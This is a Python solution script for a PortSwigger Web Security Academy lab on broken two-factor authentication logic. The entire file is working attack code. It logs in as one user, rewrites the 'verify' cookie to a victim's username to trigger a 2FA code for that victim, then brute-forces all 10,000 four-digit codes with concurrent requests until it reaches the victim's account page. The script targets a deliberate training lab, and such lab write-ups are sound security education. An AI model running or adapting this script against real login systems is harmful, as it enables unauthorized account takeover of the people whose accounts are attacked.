#!/usr/bin/env python3
"""
2FA broken logic
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 08-2fa-broken-logic.md

What this does:
    Logs in as our own account (wiener:peter) to get an authenticated session,
    then overrides the "verify" cookie to the victim's username (carlos) and
    requests /login2 -- which triggers the server to generate a fresh 2FA code
    for carlos, because it decides whose code to check from the client-supplied
    verify cookie rather than the session identity. From there it brute-forces
    the 4-digit mfa-code (0000-9999) concurrently against that same verify=carlos
    session, checking the final URL after following redirects for /my-account
    (checking the URL, not body text, avoids false positives from navigation
    links elsewhere on the page).

Usage:
    python 08-2fa-broken-logic.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import threading
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed

ATTACKER_USER = "wiener"
ATTACKER_PASS = "peter"
VICTIM_USER = "carlos"
MAX_WORKERS = 10


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    # Step 1: authenticate as ourselves, capture the session cookie.
    setup_client = httpx.Client(follow_redirects=True, timeout=15)
    login_page = setup_client.get(f"{lab_url}/login")
    setup_client.post(f"{lab_url}/login", data={
        "csrf": _csrf(login_page.text), "username": ATTACKER_USER, "password": ATTACKER_PASS
    })
    session_cookie = dict(setup_client.cookies)
    print(f"[*] Logged in as {ATTACKER_USER}, cookies: {list(session_cookie.keys())}")

    # Step 2: override verify -> victim, trigger 2FA code generation for them.
    session_cookie["verify"] = VICTIM_USER
    gen_client = httpx.Client(follow_redirects=True, timeout=15, cookies=session_cookie)
    login2_page = gen_client.get(f"{lab_url}/login2")
    csrf = _csrf(login2_page.text)
    print(f"[*] Triggered 2FA for {VICTIM_USER}, CSRF={'found' if csrf else 'none'}")

    # Step 3: concurrent brute-force of the 4-digit code.
    codes = [f"{c:04d}" for c in range(10000)]
    print(f"[*] Brute-forcing {len(codes)} codes with {MAX_WORKERS} workers...")

    stop = threading.Event()
    found_code = [None]
    lock = threading.Lock()

    def try_code(code_str: str):
        if stop.is_set():
            return
        try:
            with httpx.Client(follow_redirects=True, timeout=15, cookies=session_cookie) as c:
                data = {"mfa-code": code_str}
                if csrf:
                    data["csrf"] = csrf
                resp = c.post(f"{lab_url}/login2", data=data)
                if "/my-account" in str(resp.url):
                    with lock:
                        if found_code[0] is None:
                            found_code[0] = code_str
                    stop.set()
        except httpx.HTTPError:
            pass

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(try_code, c): c for c in codes}
        for f in as_completed(futures):
            if stop.is_set():
                for pending in futures:
                    pending.cancel()
                break

    if found_code[0]:
        print(f"[+] 2FA bypassed with code: {found_code[0]}")
    else:
        print("[-] No code matched across the full 4-digit keyspace.")

    check_client = httpx.Client(follow_redirects=True, timeout=15)
    check = check_client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
